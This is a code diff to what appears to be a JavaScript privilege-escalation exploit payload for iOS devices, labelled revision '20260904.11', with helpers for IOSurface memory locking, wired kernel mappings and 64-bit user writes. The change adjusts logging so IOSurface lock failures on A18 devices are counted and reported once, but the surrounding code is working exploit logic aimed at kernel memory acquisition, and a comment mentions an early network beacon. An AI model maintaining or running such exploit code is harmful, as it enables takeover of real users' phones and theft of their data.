@@ -1,5 +1,5 @@
 (() => {
-  const LS_PE_PAYLOAD_REVISION = "20260904.10";
+  const LS_PE_PAYLOAD_REVISION = "20260904.11";
   const PE_ENABLE_DEBUG_NETWORK = globalThis.__pe_enable_debug_network === true;
   const LS_RETAIN_KRW_FOR_VISIBLE_TEST = false;
   // Ultra-early beacon - before fcall_init, using XMLHttpRequest if available
@@ -1853,13 +1853,15 @@
     return surface;
   }
   let mlock_dict = {};
-  function surface_mlock(address, size) {
+  function surface_mlock(address, size, report_failure = true) {
     let surf = create_surface_with_address(address, size);
     if (surf == 0n) {
-      LOG((is_a18_devices
-          ? "[PE-A18] IOSurface lock creation returned null; continuing original acquisition flow"
-          : "[-] IOSurface lock creation failed") +
-          " address=" + address.hex() + " size=" + size.hex());
+      if (report_failure) {
+        LOG((is_a18_devices
+            ? "[PE-A18] IOSurface lock creation returned null; continuing original acquisition flow"
+            : "[-] IOSurface lock creation failed") +
+            " address=" + address.hex() + " size=" + size.hex());
+      }
       return false;
     }
     mlock_dict[address] = surf;
@@ -2407,6 +2409,7 @@
     LOG("[i] Allocating memory");
     let kr = KERN_SUCCESS;
     let wired_address = 0n;
+    let wired_surface_lock_failures = 0n;
     for (let i = 0n; i < n_of_wired_mapping_entries; i++) {
       if (i == 0n) {
         wired_address = new_bigint();
@@ -2421,11 +2424,23 @@
         } while (kr != KERN_SUCCESS);
       }
       wired_mapping_entries_addresses.push(wired_address);
-      surface_mlock(wired_address, wired_mapping_entry_size);
+      if (!surface_mlock(wired_address, wired_mapping_entry_size, !is_a18_devices) && is_a18_devices) {
+        wired_surface_lock_failures++;
+        if (wired_surface_lock_failures == 1n) {
+          LOG("[PE-A18] first wired IOSurface lock creation returned null; continuing original acquisition flow" +
+              " address=" + wired_address.hex() + " size=" + wired_mapping_entry_size.hex() +
+              "; later wired nulls suppressed");
+        }
+      }
       uwrite64(wired_address, wired_page_marker);
       uwrite64(wired_address + 0x8n, wired_address);
     }
     let target_inp_gencnt_list = [];
+    if (wired_surface_lock_failures != 0n) {
+      LOG("[PE-A18] wired IOSurface lock summary null=" + wired_surface_lock_failures +
+          " locked=" + (n_of_wired_mapping_entries - wired_surface_lock_failures) +
+          " total=" + n_of_wired_mapping_entries);
+    }
     LOG("[i] Allocating memory done");
     while (true) {
       let search_mapping_size = 0x800n * PAGE_SIZE;
